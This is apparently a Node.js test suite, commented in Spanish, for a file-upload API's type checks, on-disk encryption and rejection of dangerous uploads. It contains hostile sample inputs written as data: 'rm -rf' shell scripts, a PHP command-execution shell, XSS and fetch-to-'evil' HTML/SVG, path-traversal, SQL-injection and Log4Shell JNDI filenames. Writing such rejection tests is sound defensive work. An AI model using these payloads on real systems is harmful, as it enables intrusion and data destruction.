// Pruebas de la API de archivos (/api/files): tipos reales por contenido, cifrado por bloques en disco,
// rechazo de archivos peligrosos, nombres maliciosos, cuotas, Range, aislamiento entre usuarios e
// integridad. Las de integración usan MySQL/MariaDB REAL y el servidor con sus middlewares reales.
//
//   npm run test:files

const test = require('node:test');
const assert = require('node:assert');
const crypto = require('crypto');
const fs = require('fs');
const os = require('os');
const path = require('path');
const net = require('net');
const { pipeline } = require('stream/promises');
const { Readable } = require('stream');

const { filesDir } = require('./test_helpers/env');
const helpers = require('./test_helpers/app');
const { api, registerAndLogin, testIp } = helpers;

const cipher = require('./src/files/file-cipher');
const types = require('./src/files/file-types');

// ============================================================================ muestras de archivos reales (mínimos)

const bytes = (...parts) => Buffer.concat(parts.map(p => (Buffer.isBuffer(p) ? p : Buffer.from(p))));
const filler = (n, seed = 1) => { const b = Buffer.alloc(n); for (let i = 0; i < n; i++) b[i] = (i * 31 + seed) & 0xff; return b; };

const SAMPLES = {
    jpeg: { name: 'foto.jpg', mime: 'image/jpeg', data: bytes([0xff, 0xd8, 0xff, 0xe0, 0, 0x10], 'JFIF\0', filler(3000), [0xff, 0xd9]) },
    png: { name: 'logo.png', mime: 'image/png', data: bytes([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a], filler(5000, 2)) },
    gif: { name: 'anim.gif', mime: 'image/gif', data: bytes('GIF89a', filler(2000, 3)) },
    webp: { name: 'foto.webp', mime: 'image/webp', data: bytes('RIFF', [0, 0, 0, 0], 'WEBPVP8 ', filler(2000, 4)) },
    mp4: { name: 'video.mp4', mime: 'video/mp4', data: bytes([0, 0, 0, 0x18], 'ftypisom', [0, 0, 2, 0], 'isomiso2', filler(200_000, 5)) },
    mov: { name: 'clip.mov', mime: 'video/quicktime', data: bytes([0, 0, 0, 0x14], 'ftypqt  ', [0, 0, 0, 0], 'qt  ', filler(5000, 6)) },
    webm: { name: 'clip.webm', mime: 'video/webm', data: bytes([0x1a, 0x45, 0xdf, 0xa3, 0x9f, 0x42, 0x86, 0x81, 0x01], 'B\x82\x84webm', filler(8000, 7)) },
    mp3id3: { name: 'cancion.mp3', mime: 'audio/mpeg', data: bytes('ID3', [3, 0, 0, 0, 0, 0, 0], filler(6000, 8)) },
    mp3frame: { name: 'frame.mp3', mime: 'audio/mpeg', data: bytes([0xff, 0xfb, 0x90, 0x64], filler(4000, 9)) },
    wav: { name: 'voz.wav', mime: 'audio/wav', data: bytes('RIFF', [0x24, 0, 0, 0], 'WAVEfmt ', filler(3000, 10)) },
    ogg: { name: 'tema.ogg', mime: 'audio/ogg', data: bytes('OggS', [0, 2], filler(3000, 11)) },
    flac: { name: 'tema.flac', mime: 'audio/flac', data: bytes('fLaC', [0, 0, 0, 0x22], filler(3000, 12)) },
    m4a: { name: 'audio.m4a', mime: 'audio/mp4', data: bytes([0, 0, 0, 0x14], 'ftypM4A ', [0, 0, 0, 0], 'M4A ', filler(3000, 13)) },
    pdf: { name: 'informe.pdf', mime: 'application/pdf', data: bytes('%PDF-1.7\n', filler(4000, 14), '\n%%EOF\n') },
    txt: { name: 'notas.txt', mime: 'text/plain', data: Buffer.from('Línea uno\nLínea dos con acentos: áéíóú ñ 日本語\n'.repeat(50)) },
    csv: { name: 'datos.csv', mime: 'text/plain', data: Buffer.from('a,b,c\n1,2,3\n') },
    json: { name: 'datos.json', mime: 'text/plain', data: Buffer.from('{"clave":"valor"}') }
};

const multipart = (data, name, field = 'file') => {
    const form = new FormData();
    form.append(field, new Blob([data]), name);
    return form;
};

// ============================================================================ detector de tipos (puro)

for (const [key, sample] of Object.entries(SAMPLES)) {
    test(`tipos: ${key} se reconoce por su contenido`, () => {
        const detected = types.detectType(sample.data.subarray(0, 4096));
        if (sample.mime === 'text/plain') {
            assert.strictEqual(detected, null, 'el texto no tiene firma');
            assert.ok(types.looksLikeText(sample.data.subarray(0, 4096)));
        } else {
            assert.strictEqual(detected?.mime, sample.mime);
        }
    });
}

test('tipos: ejecutables, scripts y comprimidos se rechazan con motivo propio', () => {
    const cases = {
        'ejecutable de Windows': [bytes('MZ', filler(100)), 'EXECUTABLE_CONTENT'],
        'ELF de Linux': [bytes([0x7f, 0x45, 0x4c, 0x46], filler(100)), 'EXECUTABLE_CONTENT'],
        'Mach-O': [bytes([0xcf, 0xfa, 0xed, 0xfe], filler(100)), 'EXECUTABLE_CONTENT'],
        'clase Java': [bytes([0xca, 0xfe, 0xba, 0xbe], filler(100)), 'EXECUTABLE_CONTENT'],
        'script con shebang': [bytes('#!/bin/sh\nrm -rf /\n'), 'EXECUTABLE_CONTENT'],
        'ZIP / DOCX / JAR': [bytes([0x50, 0x4b, 0x03, 0x04], filler(100)), 'ARCHIVE_NOT_ALLOWED'],
        'gzip': [bytes([0x1f, 0x8b, 8, 0], filler(100)), 'ARCHIVE_NOT_ALLOWED'],
        'RAR': [bytes('Rar!', filler(100)), 'ARCHIVE_NOT_ALLOWED']
    };
    for (const [name, [data, reason]] of Object.entries(cases)) {
        assert.strictEqual(types.detectType(data)?.rejected, reason, name);
    }
});

test('tipos: HTML, SVG y XML no tienen tipo permitido (aunque se llamen .txt)', () => {
    for (const html of ['<!DOCTYPE html><html><script>alert(1)</script>', '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>', '<?xml version="1.0"?><x/>', '<html><body>x</body></html>', '<?php system($_GET[0]); ?>', 'x <script>alert(1)</script>']) {
        const head = Buffer.from(html);
        assert.strictEqual(types.detectType(head), null);
        assert.ok(types.hasActiveContent(head), html);
    }
    assert.ok(!types.hasActiveContent(Buffer.from('Un texto normal sin etiquetas.')));
});

test('tipos: binario disfrazado de texto no pasa looksLikeText', () => {
    assert.ok(!types.looksLikeText(bytes('texto', [0], 'con nulo')));
    assert.ok(!types.looksLikeText(Buffer.from([0xff, 0xfe, 0xfd, 0xfc])));
    assert.ok(!types.looksLikeText(bytes('texto', [0x01, 0x02])));
});

test('nombres: se limpian rutas, controles, bidi (\\u202e), nombres reservados y longitud', () => {
    assert.strictEqual(types.sanitizeFilename('../../etc/passwd'), 'passwd');
    assert.strictEqual(types.sanitizeFilename('C:\\Users\\x\\foto.png'), 'foto.png');
    assert.strictEqual(types.sanitizeFilename('a\r\nb\u0000c.jpg'), 'abc.jpg');
    assert.strictEqual(types.sanitizeFilename('foto\u202egpj.exe'), 'fotogpj.exe', 'el RLO que oculta la extensión real se elimina');
    assert.strictEqual(types.sanitizeFilename('.htaccess'), 'htaccess');
    assert.strictEqual(types.sanitizeFilename('...'), 'archivo');
    assert.strictEqual(types.sanitizeFilename(''), 'archivo');
    assert.strictEqual(types.sanitizeFilename('CON.txt'), '_CON.txt');
    assert.strictEqual(types.sanitizeFilename('a<b>c:d"e|f?g*h.png'), 'a_b_c_d_e_f_g_h.png');
    assert.strictEqual(types.sanitizeFilename('nombre. '), 'nombre');
    const long = types.sanitizeFilename('x'.repeat(500) + '.png');
    assert.ok(long.length <= 120 && long.endsWith('.png'));
});

test('nombres: extensiones prohibidas en CUALQUIER segmento (foto.php.jpg)', () => {
    for (const bad of ['a.php', 'a.PHP.jpg', 'a.exe', 'a.svg', 'a.html', 'a.js', 'a.sh', 'a.jar', 'a.jpg.exe', 'a.tar.sh', 'x.phtml.png', 'a.xml']) {
        assert.ok(types.hasForbiddenExtension(bad), bad);
    }
    for (const ok of ['foto.jpg', 'informe final v2.pdf', 'a.b.c.png', 'archivo sin extension']) {
        assert.ok(!types.hasForbiddenExtension(ok), ok);
    }
});

test('Content-Disposition: sin inyección de cabeceras, ASCII seguro y nombre real en filename*', () => {
    const header = types.contentDisposition('na"me\r\nSet-Cookie: x=1.png');
    assert.ok(!/[\r\n]/.test(header));
    assert.ok(/^attachment; filename="[A-Za-z0-9._-]+"; filename\*=UTF-8''[A-Za-z0-9%._-]+$/.test(header), header);
    assert.ok(types.contentDisposition('ñandú.png', 'inline').startsWith('inline;'));
    assert.ok(types.contentDisposition('ñandú.png').includes("UTF-8''%C3%B1and%C3%BA.png"));
});

// ============================================================================ cifrado por bloques (puro)

const tmpFile = () => path.join(os.tmpdir(), `cipher-${crypto.randomBytes(6).toString('hex')}`);

async function encryptToFile(plain, key) {
    const file = tmpFile();
    const encrypt = new cipher.EncryptStream(key);
    await pipeline(Readable.from([plain]), encrypt, fs.createWriteStream(file));
    return { file, encrypt };
}
async function readAll(iterable) {
    const parts = [];
    for await (const part of iterable) parts.push(part);
    return Buffer.concat(parts);
}

const SIZES = [0, 1, 15, 16, cipher.CHUNK - 1, cipher.CHUNK, cipher.CHUNK + 1, 2 * cipher.CHUNK, 3 * cipher.CHUNK + 17];

for (const size of SIZES) {
    test(`bloques: ida y vuelta con ${size} bytes (tamaño en disco exacto, hash correcto)`, async () => {
        const key = cipher.newDataKey();
        const plain = crypto.randomBytes(size);
        const { file, encrypt } = await encryptToFile(plain, key);
        try {
            assert.strictEqual(fs.statSync(file).size, cipher.cipherSize(size));
            assert.strictEqual(encrypt.plainBytes, size);
            assert.strictEqual(encrypt.sha256(), crypto.createHash('sha256').update(plain).digest('hex'));
            // "El texto en claro no aparece en disco": solo significa algo con un patrón largo. Con 1 byte, ese byte está por azar
            // en ~11% de los archivos cifrados (30+ bytes aleatorios), lo que hacía fallar la prueba de forma intermitente.
            if (size >= 8) assert.ok(!fs.readFileSync(file).includes(plain.subarray(0, Math.min(16, size))));

            const back = await readAll(cipher.decryptRange({ filePath: file, key, plainSize: size }));
            assert.ok(back.equals(plain));
        } finally { fs.rmSync(file, { force: true }); }
    });
}

test('bloques: rangos arbitrarios devuelven exactamente esos bytes', async () => {
    const key = cipher.newDataKey();
    const size = 3 * cipher.CHUNK + 1234;
    const plain = crypto.randomBytes(size);
    const { file } = await encryptToFile(plain, key);
    try {
        const ranges = [[0, 0], [0, 9], [5, cipher.CHUNK - 1], [cipher.CHUNK - 1, cipher.CHUNK], [cipher.CHUNK, 2 * cipher.CHUNK - 1], [100, size - 1], [size - 1, size - 1], [0, size - 1], [cipher.CHUNK + 7, 2 * cipher.CHUNK + 900]];
        for (const [start, end] of ranges) {
            const got = await readAll(cipher.decryptRange({ filePath: file, key, plainSize: size, start, end }));
            assert.ok(got.equals(plain.subarray(start, end + 1)), `rango ${start}-${end}`);
        }
    } finally { fs.rmSync(file, { force: true }); }
});

test('bloques: alterar UN bit en cualquier zona del disco se detecta', async () => {
    const key = cipher.newDataKey();
    const size = 2 * cipher.CHUNK + 500;
    const { file } = await encryptToFile(crypto.randomBytes(size), key);
    try {
        const original = fs.readFileSync(file);
        for (const position of [0, 100, cipher.CHUNK - 1, cipher.CHUNK, cipher.CHUNK + 16, cipher.CHUNK + 17, original.length - 1, original.length - 17]) {
            const tampered = Buffer.from(original);
            tampered[position] ^= 0x01;
            fs.writeFileSync(file, tampered);
            await assert.rejects(readAll(cipher.decryptRange({ filePath: file, key, plainSize: size })), /FILE_CORRUPT/, `byte ${position}`);
        }
    } finally { fs.rmSync(file, { force: true }); }
});

test('bloques: truncar, ampliar o reordenar bloques se detecta (no se puede acortar un archivo en silencio)', async () => {
    const key = cipher.newDataKey();
    const size = 3 * cipher.CHUNK;
    const plain = crypto.randomBytes(size);
    const { file } = await encryptToFile(plain, key);
    try {
        const original = fs.readFileSync(file);
        const block = cipher.CHUNK + cipher.TAG;

        fs.writeFileSync(file, original.subarray(0, 2 * block)); // se quita el último bloque
        await assert.rejects(readAll(cipher.decryptRange({ filePath: file, key, plainSize: size })), /FILE_CORRUPT/);
        // aunque el atacante también "arregle" el tamaño que se anuncia, el bloque final ya no es el final
        await assert.rejects(readAll(cipher.decryptRange({ filePath: file, key, plainSize: 2 * cipher.CHUNK })), /FILE_CORRUPT/);

        fs.writeFileSync(file, Buffer.concat([original, Buffer.alloc(10)]));
        await assert.rejects(readAll(cipher.decryptRange({ filePath: file, key, plainSize: size })), /FILE_CORRUPT/);

        fs.writeFileSync(file, Buffer.concat([original.subarray(block, 2 * block), original.subarray(0, block), original.subarray(2 * block)]));
        await assert.rejects(readAll(cipher.decryptRange({ filePath: file, key, plainSize: size })), /FILE_CORRUPT/, 'bloques intercambiados');
    } finally { fs.rmSync(file, { force: true }); }
});

test('bloques: otra clave no descifra, y dos cifrados del mismo archivo no se parecen', async () => {
    const plain = crypto.randomBytes(1000);
    const a = await encryptToFile(plain, cipher.newDataKey());
    const b = await encryptToFile(plain, cipher.newDataKey());
    try {
        assert.ok(!fs.readFileSync(a.file).equals(fs.readFileSync(b.file)));
        await assert.rejects(readAll(cipher.decryptRange({ filePath: a.file, key: cipher.newDataKey(), plainSize: 1000 })), /FILE_CORRUPT/);
    } finally { fs.rmSync(a.file, { force: true }); fs.rmSync(b.file, { force: true }); }
});

test('Range: parseRange cubre rangos válidos, sufijos, abiertos y no satisfacibles', () => {
    const p = cipher.parseRange;
    assert.deepStrictEqual(p('bytes=0-99', 1000), { start: 0, end: 99 });
    assert.deepStrictEqual(p('bytes=500-', 1000), { start: 500, end: 999 });
    assert.deepStrictEqual(p('bytes=-100', 1000), { start: 900, end: 999 });
    assert.deepStrictEqual(p('bytes=900-5000', 1000), { start: 900, end: 999 });
    assert.deepStrictEqual(p('bytes=-5000', 1000), { start: 0, end: 999 });
    assert.strictEqual(p('bytes=1000-1100', 1000), 'unsatisfiable');
    assert.strictEqual(p('bytes=50-10', 1000), 'unsatisfiable');
    assert.strictEqual(p('bytes=-0', 1000), 'unsatisfiable');
    for (const ignored of [undefined, '', 'items=0-5', 'bytes=0-1,5-9', 'bytes=-', 'bytes=a-b', 'bytes=0-1; x']) assert.strictEqual(p(ignored, 1000), null, String(ignored));
});

// ============================================================================ INTEGRACIÓN

let dbAvailable = false;
let app;
let db;
let enc;
let events;
let alice;
let bob;
let ipA;
let ipB;

test.before(async () => {
    dbAvailable = await helpers.prepareDatabase();
    if (!dbAvailable) return;
    db = require('./src/config/database');
    enc = require('./src/crypto/tripleEncryptor');
    events = require('./src/security/security-events.service');
    app = await helpers.startApp();
    ipA = testIp(); ipB = testIp();
    alice = await registerAndLogin(app.base, { ip: ipA });
    bob = await registerAndLogin(app.base, { ip: ipB });
});

test.after(async () => {
    if (app) await app.close();
    if (db?.pool) await db.pool.end();
    fs.rmSync(filesDir, { recursive: true, force: true });
});

const itDb = (name, fn) => test(name, async (t) => {
    if (!dbAvailable) return t.skip('sin base de datos');
    await fn(t);
});

const upload = (user, ip, data, name, extra = {}) => api(app.base, 'POST', '/api/files', { token: user.token, ip, form: multipart(data, name, extra.field), ...extra.opts });
const download = (user, ip, id, query = '', headers = {}) => api(app.base, 'GET', `/api/files/${id}/download${query}`, { token: user.token, ip, headers });
const storedFiles = () => {
    const out = [];
    const walk = (dir) => { if (!fs.existsSync(dir)) return; for (const e of fs.readdirSync(dir, { withFileTypes: true })) { const f = path.join(dir, e.name); e.isDirectory() ? walk(f) : out.push(f); } };
    walk(path.join(filesDir, 'files'));
    return out;
};
const tmpFiles = () => (fs.existsSync(path.join(filesDir, 'tmp')) ? fs.readdirSync(path.join(filesDir, 'tmp')) : []);
const fileEvents = async (ip, rule) => (await db.query('SELECT * FROM security_events WHERE ip_address = ? AND event_type = ? AND rule = ?', [ip, 'FILE_REJECTED', rule]))[0];

// ---------------------------------------------------------------- tipos aceptados: subida → listado → descarga idéntica

for (const [key, sample] of Object.entries(SAMPLES)) {
    itDb(`subida/descarga: ${key} (${sample.mime}) vuelve byte a byte idéntico`, async () => {
        const res = await upload(alice, ipA, sample.data, sample.name);
        assert.strictEqual(res.status, 201, res.text);
        assert.strictEqual(res.body.file.mimeType, sample.mime);
        assert.strictEqual(res.body.file.size, sample.data.length);
        assert.strictEqual(res.body.file.sha256, crypto.createHash('sha256').update(sample.data).digest('hex'));

        const got = await download(alice, ipA, res.body.file.id);
        assert.strictEqual(got.status, 200);
        assert.ok(got.buffer.equals(sample.data), 'contenido idéntico');
        assert.strictEqual(got.headers.get('content-type').split(';')[0], sample.mime);
        assert.strictEqual(got.headers.get('x-content-sha256'), res.body.file.sha256);
    });
}

itDb('cabeceras de descarga: attachment por defecto, nosniff, CSP sandbox y sin caché', async () => {
    const up = await upload(alice, ipA, SAMPLES.png.data, 'ñandú "raro".png');
    const got = await download(alice, ipA, up.body.file.id);
    assert.ok(got.headers.get('content-disposition').startsWith('attachment;'));
    assert.ok(got.headers.get('content-disposition').includes("filename*=UTF-8''%C3%B1and%C3%BA%20_raro_.png") || got.headers.get('content-disposition').includes('filename*=UTF-8'));
    assert.strictEqual(got.headers.get('x-content-type-options'), 'nosniff');
    assert.strictEqual(got.headers.get('content-security-policy'), "default-src 'none'; sandbox");
    assert.match(got.headers.get('cache-control'), /no-store/);
    assert.match(got.headers.get('cache-control'), /no-transform/);
    assert.strictEqual(got.headers.get('accept-ranges'), 'bytes');
});

itDb('inline solo para imagen/audio/vídeo; PDF y texto SIEMPRE como descarga', async () => {
    const png = (await upload(alice, ipA, SAMPLES.png.data, 'a.png')).body.file.id;
    const pdf = (await upload(alice, ipA, SAMPLES.pdf.data, 'a.pdf')).body.file.id;
    const txt = (await upload(alice, ipA, SAMPLES.txt.data, 'a.txt')).body.file.id;

    assert.ok((await download(alice, ipA, png, '?inline=true')).headers.get('content-disposition').startsWith('inline;'));
    assert.ok((await download(alice, ipA, pdf, '?inline=true')).headers.get('content-disposition').startsWith('attachment;'));
    const t = await download(alice, ipA, txt, '?inline=true');
    assert.ok(t.headers.get('content-disposition').startsWith('attachment;'));
    assert.strictEqual(t.headers.get('content-type'), 'text/plain; charset=utf-8');
});

itDb('en disco SOLO hay texto cifrado: ni el contenido ni el nombre en claro; permisos 0600', async () => {
    const marker = 'MARCADOR-SECRETO-EN-CLARO-0123456789';
    const data = bytes('%PDF-1.4\n', marker.repeat(200), '\n%%EOF');
    const up = await upload(alice, ipA, data, 'documento-privado-xyz.pdf');
    assert.strictEqual(up.status, 201);

    for (const file of storedFiles()) {
        const raw = fs.readFileSync(file);
        assert.ok(!raw.includes(marker), 'contenido en claro en disco');
        assert.ok(!raw.includes('%PDF-'), 'firma del archivo en claro');
        assert.strictEqual(fs.statSync(file).mode & 0o777, 0o600);
    }
    const [[row]] = await db.query('SELECT filename_encrypted, key_encrypted, storage_name FROM user_files WHERE id = ?', [up.body.file.id]);
    assert.ok(row.filename_encrypted.startsWith('v4:') && !row.filename_encrypted.includes('documento-privado'));
    assert.ok(row.key_encrypted.startsWith('v4:'));
    assert.ok(/^[0-9a-f-]{36}$/.test(row.storage_name), 'el nombre en disco es un UUID, no el del usuario');
    assert.ok(!storedFiles().some(f => f.includes('documento-privado')));
});

itDb('archivos grandes (varios bloques): ida y vuelta, Range, sufijo, HEAD y 416', async () => {
    const big = bytes([0xff, 0xd8, 0xff, 0xe0], crypto.randomBytes(3 * cipher.CHUNK + 4321));
    const up = await upload(alice, ipA, big, 'grande.jpg');
    assert.strictEqual(up.status, 201);
    const id = up.body.file.id;

    const full = await download(alice, ipA, id);
    assert.ok(full.buffer.equals(big));

    const mid = await download(alice, ipA, id, '', { Range: 'bytes=70000-140000' });
    assert.strictEqual(mid.status, 206);
    assert.strictEqual(mid.headers.get('content-range'), `bytes 70000-140000/${big.length}`);
    assert.strictEqual(mid.headers.get('content-length'), '70001');
    assert.ok(mid.buffer.equals(big.subarray(70000, 140001)));

    const tail = await download(alice, ipA, id, '', { Range: 'bytes=-100' });
    assert.strictEqual(tail.status, 206);
    assert.ok(tail.buffer.equals(big.subarray(big.length - 100)));

    const open = await download(alice, ipA, id, '', { Range: `bytes=${big.length - 10}-` });
    assert.ok(open.buffer.equals(big.subarray(big.length - 10)));

    const bad = await download(alice, ipA, id, '', { Range: `bytes=${big.length + 5}-` });
    assert.strictEqual(bad.status, 416);
    assert.strictEqual(bad.headers.get('content-range'), `bytes */${big.length}`);

    const multi = await download(alice, ipA, id, '', { Range: 'bytes=0-1,5-6' });
    assert.strictEqual(multi.status, 200, 'varios rangos: se sirve entero');

    const head = await api(app.base, 'HEAD', `/api/files/${id}/download`, { token: alice.token, ip: ipA });
    assert.strictEqual(head.status, 200);
    assert.strictEqual(head.headers.get('content-length'), String(big.length));
    assert.strictEqual(head.buffer.length, 0);
});

itDb('archivo vacío (.txt) y metadatos: listado, paginación por cursor, filtro por categoría y cuota', async () => {
    const user = await registerAndLogin(app.base, { ip: testIp() });
    const ip = testIp();
    const empty = await upload(user, ip, Buffer.alloc(0), 'vacio.txt');
    assert.strictEqual(empty.status, 201);
    assert.strictEqual((await download(user, ip, empty.body.file.id)).buffer.length, 0);

    for (let i = 0; i < 3; i++) await upload(user, ip, SAMPLES.png.data, `img${i}.png`);
    await upload(user, ip, SAMPLES.pdf.data, 'doc.pdf');

    const all = await api(app.base, 'GET', '/api/files?limit=2', { token: user.token, ip });
    assert.strictEqual(all.body.files.length, 2);
    assert.ok(all.body.nextBefore);
    const next = await api(app.base, 'GET', `/api/files?limit=10&before=${all.body.nextBefore}`, { token: user.token, ip });
    assert.strictEqual(next.body.files.length, 3);
    assert.ok(next.body.files.every(f => f.id < all.body.nextBefore));

    const onlyImages = await api(app.base, 'GET', '/api/files?category=image', { token: user.token, ip });
    assert.deepStrictEqual([...new Set(onlyImages.body.files.map(f => f.category))], ['image']);
    assert.ok(onlyImages.body.files.every(f => typeof f.name === 'string' && f.name.endsWith('.png')));

    const quota = await api(app.base, 'GET', '/api/files/quota', { token: user.token, ip });
    assert.strictEqual(quota.body.quota.usedFiles, 5);
    assert.strictEqual(quota.body.quota.usedBytes, 3 * SAMPLES.png.data.length + SAMPLES.pdf.data.length);
});

// ---------------------------------------------------------------- archivos peligrosos: rechazados, registrados y sin rastro

const REJECTIONS = [
    ['ejecutable de Windows renombrado a .jpg', bytes('MZ', filler(500)), 'foto.jpg', 415, 'EXECUTABLE_CONTENT'],
    ['ELF renombrado a .png', bytes([0x7f, 0x45, 0x4c, 0x46], filler(500)), 'logo.png', 415, 'EXECUTABLE_CONTENT'],
    ['script de shell con .txt', bytes('#!/bin/sh\nrm -rf ~\n'), 'notas.txt', 415, 'EXECUTABLE_CONTENT'],
    ['ZIP/DOCX', bytes([0x50, 0x4b, 0x03, 0x04], filler(500)), 'datos.zip', 415, 'ARCHIVE_NOT_ALLOWED'],
    ['JPEG con extensión .png', SAMPLES.jpeg.data, 'foto.png', 415, 'EXTENSION_MISMATCH'],
    ['PNG con extensión .pdf', SAMPLES.png.data, 'doc.pdf', 415, 'EXTENSION_MISMATCH'],
    ['doble extensión .php.jpg', SAMPLES.jpeg.data, 'imagen.php.jpg', 415, 'FORBIDDEN_EXTENSION'],
    ['extensión .exe', SAMPLES.jpeg.data, 'foto.jpg.exe', 415, 'FORBIDDEN_EXTENSION'],
    ['SVG con script', bytes('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), 'dibujo.svg', 415, 'FORBIDDEN_EXTENSION'],
    ['SVG renombrado a .txt', bytes('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'), 'dibujo.txt', 415, 'ACTIVE_CONTENT'],
    ['HTML renombrado a .txt', bytes('<!DOCTYPE html><html><script>fetch("//evil")</script></html>'), 'pagina.txt', 415, 'ACTIVE_CONTENT'],
    ['PHP en un .txt', bytes('<?php system($_GET["c"]); ?>'), 'x.txt', 415, 'ACTIVE_CONTENT'],
    ['binario aleatorio como .txt', bytes('texto ', [0, 1, 2, 3, 0xff, 0xfe], 'más'), 'raro.txt', 415, 'UNSUPPORTED_TYPE'],
    ['tipo desconocido', crypto.randomBytes(2000), 'datos.bin2', 415, 'UNSUPPORTED_TYPE'],
    ['jpg vacío', Buffer.alloc(0), 'vacio.jpg', 415, 'UNSUPPORTED_TYPE'],
    ['nombre con ../ (recorrido de directorios)', SAMPLES.png.data, '../../etc/passwd.png', 400, 'PATH_TRAVERSAL'],
    ['nombre con ..\\ de Windows', SAMPLES.png.data, '..\\..\\windows\\system32\\x.png', 400, 'PATH_TRAVERSAL'],
    ['nombre con inyección SQL', SAMPLES.png.data, "x'; DROP TABLE user_files;--.png", 400, 'SQLI_STACKED'],
    ["nombre con ' OR 1=1", SAMPLES.png.data, "' OR '1'='1.png", 400, 'SQLI_TAUTOLOGY'],
    ['nombre con <script>', SAMPLES.png.data, '<script>alert(1)</script>.png', 400, 'XSS_SCRIPT_TAG'],
    ['nombre con JNDI', SAMPLES.png.data, '${jndi:ldap://evil/x}.png', 400, 'LOG4SHELL_JNDI']
];

for (const [name, data, filename, status, rule] of REJECTIONS) {
    itDb(`rechazado — ${name}`, async () => {
        const user = await registerAndLogin(app.base, { ip: testIp() });
        const ip = testIp();
        const tmpBefore = tmpFiles().length, filesBefore = storedFiles().length;
        const [[{ rowsBefore }]] = await db.query('SELECT COUNT(*) AS rowsBefore FROM user_files');

        const res = await upload(user, ip, data, filename);
        assert.strictEqual(res.status, status, res.text);
        assert.ok(res.body.code, 'código de error estable');

        // sin rastro: ni fila, ni archivo temporal, ni archivo definitivo
        const [[{ rowsAfter }]] = await db.query('SELECT COUNT(*) AS rowsAfter FROM user_files');
        assert.strictEqual(rowsAfter, rowsBefore);
        assert.strictEqual(tmpFiles().length, tmpBefore, 'queda un temporal');
        assert.strictEqual(storedFiles().length, filesBefore, 'queda un archivo');

        // y queda anotado para analizar
        assert.ok((await fileEvents(ip, rule)).length >= 1, `sin evento FILE_REJECTED/${rule}`);
    });
}

itDb('nombre con \\u202e (RLO) se acepta PERO sanitizado: la extensión visible es la real', async () => {
    const res = await upload(alice, ipA, SAMPLES.png.data, 'foto\u202egnp.png');
    assert.strictEqual(res.status, 201);
    assert.ok(!res.body.file.name.includes('\u202e'));
});

itDb('forma de la petición: no multipart, campo equivocado, varios archivos, sin archivo, sin nombre', async () => {
    const ip = testIp();
    const json = await api(app.base, 'POST', '/api/files', { token: alice.token, ip, json: { file: 'x' } });
    assert.strictEqual(json.status, 415);
    assert.strictEqual(json.body.code, 'EXPECTED_MULTIPART');

    const wrongField = await upload(alice, ip, SAMPLES.png.data, 'a.png', { field: 'otro' });
    assert.strictEqual(wrongField.status, 400);
    assert.strictEqual(wrongField.body.code, 'UNEXPECTED_FILE_FIELD');

    const two = new FormData();
    two.append('file', new Blob([SAMPLES.png.data]), 'a.png');
    two.append('file', new Blob([SAMPLES.png.data]), 'b.png');
    const multi = await api(app.base, 'POST', '/api/files', { token: alice.token, ip, form: two });
    assert.ok([400].includes(multi.status), multi.text);

    const none = new FormData();
    none.append('campo', 'sin archivo');
    assert.strictEqual((await api(app.base, 'POST', '/api/files', { token: alice.token, ip, form: none })).body.code, 'NO_FILE');

    assert.strictEqual((await api(app.base, 'POST', '/api/files', { token: alice.token, ip })).status, 415);
    assert.strictEqual((await api(app.base, 'POST', '/api/files', { ip, form: multipart(SAMPLES.png.data, 'a.png') })).status, 401);
    assert.deepStrictEqual(tmpFiles().filter(f => f.endsWith('.part')), [], 'ningún temporal huérfano');
});

itDb('tamaño: por encima del máximo de su categoría → 413 y sin rastro', async () => {
    const saved = process.env.UPLOAD_MAX_IMAGE_MB;
    process.env.UPLOAD_MAX_IMAGE_MB = '1';
    try {
        const big = bytes([0xff, 0xd8, 0xff, 0xe0], filler(2 * 1024 * 1024));
        const ip = testIp();
        const res = await upload(alice, ip, big, 'enorme.jpg');
        assert.strictEqual(res.status, 413);
        assert.strictEqual(res.body.code, 'FILE_TOO_LARGE');
        assert.deepStrictEqual(tmpFiles().filter(f => f.endsWith('.part')), []);
        assert.ok((await fileEvents(ip, 'FILE_TOO_LARGE')).length >= 1);

        const ok = await upload(alice, ip, bytes([0xff, 0xd8, 0xff, 0xe0], filler(500 * 1024)), 'justo.jpg');
        assert.strictEqual(ok.status, 201, 'por debajo del máximo sí pasa');
    } finally {
        if (saved === undefined) delete process.env.UPLOAD_MAX_IMAGE_MB; else process.env.UPLOAD_MAX_IMAGE_MB = saved;
    }
});

itDb('tamaño: el límite lo decide el TIPO REAL, no el que declara el nombre', async () => {
    const saved = process.env.UPLOAD_MAX_TEXT_MB;
    process.env.UPLOAD_MAX_TEXT_MB = '1';
    try {
        const bigText = Buffer.from('línea de texto\n'.repeat(120_000)); // ~1,8 MB
        const res = await upload(alice, testIp(), bigText, 'log.txt');
        assert.strictEqual(res.status, 413);
    } finally {
        if (saved === undefined) delete process.env.UPLOAD_MAX_TEXT_MB; else process.env.UPLOAD_MAX_TEXT_MB = saved;
    }
});

itDb('texto: UTF-8 inválido o NUL más allá de los primeros bytes también se rechaza', async () => {
    const ok = Buffer.from('a'.repeat(6000));
    const lateNul = Buffer.concat([ok, Buffer.from([0]), Buffer.from('fin')]);
    const lateBad = Buffer.concat([ok, Buffer.from([0xff, 0xfe, 0xfa]), Buffer.from('fin')]);
    assert.strictEqual((await upload(alice, testIp(), lateNul, 'a.txt')).status, 415);
    assert.strictEqual((await upload(alice, testIp(), lateBad, 'a.txt')).status, 415);
    assert.deepStrictEqual(tmpFiles().filter(f => f.endsWith('.part')), []);
});

itDb('subida interrumpida a medias: no queda ni fila ni archivo', async () => {
    const ip = testIp();
    const boundary = '----corte' + crypto.randomBytes(4).toString('hex');
    const head = `--${boundary}\r\nContent-Disposition: form-data; name="file"; filename="cortada.png"\r\nContent-Type: image/png\r\n\r\n`;
    const tmpBefore = tmpFiles().length, filesBefore = storedFiles().length;

    await new Promise((resolve) => {
        const socket = net.connect(app.port, '127.0.0.1', () => {
            socket.write(`POST /api/files HTTP/1.1\r\nHost: x\r\nAuthorization: Bearer ${alice.token}\r\nX-Forwarded-For: ${ip}\r\nContent-Type: multipart/form-data; boundary=${boundary}\r\nContent-Length: 900000\r\n\r\n`);
            socket.write(head);
            socket.write(SAMPLES.png.data);
            setTimeout(() => { socket.destroy(); resolve(); }, 150);
        });
        socket.on('error', () => resolve());
    });
    await new Promise(r => setTimeout(r, 400));

